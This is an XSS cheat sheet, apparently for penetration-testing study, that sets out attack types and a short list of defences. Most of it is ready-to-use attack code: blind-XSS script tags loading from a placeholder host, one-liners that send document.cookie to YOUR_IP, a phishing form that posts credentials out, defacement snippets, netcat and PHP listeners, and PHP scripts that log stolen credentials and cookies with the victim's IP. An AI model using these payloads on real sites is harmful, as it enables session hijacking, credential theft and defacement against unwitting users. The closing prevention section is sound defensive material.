# XSS Security Cheat Sheet

## XSS Types
- **Stored (Persistent)**: Input stored in database, affects all users
- **Reflected (Non-Persistent)**: Input processed by backend, temporary
- **DOM-based**: Processed client-side only, never reaches backend

## Basic Testing Payloads
```html
<script>alert(window.origin)</script>
<plaintext>
<script>print()</script>
<img src="" onerror=alert(window.origin)>
```

## Remote Script Loading (Blind XSS)
```html
<script src="http://YOUR_IP/fieldname"></script>
'><script src=http://YOUR_IP></script>
"><script src=http://YOUR_IP></script>
```

## Session Hijacking
```javascript
new Image().src='http://YOUR_IP/index.php?c='+document.cookie;
document.location='http://YOUR_IP/index.php?c='+document.cookie;
```

## Web Defacing
```javascript
// Change background
document.body.style.background = "#141d2b"

// Change title
document.title = 'New Title'

// Change page content
document.getElementsByTagName('body')[0].innerHTML = "New Content"
```

## Phishing Form Injection
```javascript
document.write('<form action=http://YOUR_IP><input type="username" placeholder="Username"><input type="password" placeholder="Password"><input type="submit" value="Login"></form>');
document.getElementById('original-form').remove();
```

## Server Setup
```bash
# Netcat listener
sudo nc -lvnp 80

# PHP server
mkdir /tmp/tmpserver && cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

## Credential Harvesting PHP
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://ORIGINAL_SITE");
    fclose($file);
    exit();
}
?>
```

## Cookie Stealing PHP
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

## Prevention Techniques

### Input Validation
```php
// PHP
filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)
addslashes($_GET['input'])
htmlspecialchars($_GET['input'])
htmlentities($_GET['input'])
```

```javascript
// JavaScript
DOMPurify.sanitize(dirty_input)
```

### Dangerous Functions to Avoid
- **JavaScript**: `innerHTML`, `outerHTML`, `document.write()`, `eval()`
- **jQuery**: `html()`, `append()`, `add()`, `after()`

### Security Headers
- `Content-Security-Policy: script-src 'self'`
- `X-Content-Type-Options: nosniff`
- `HttpOnly` and `Secure` cookie flags

## Key Concepts
- **Source**: Where user input originates
- **Sink**: Where input gets rendered/executed
- **Persistent vs Non-Persistent**: Stored in database vs temporary
- **Client-side vs Server-side**: DOM manipulation vs backend processing
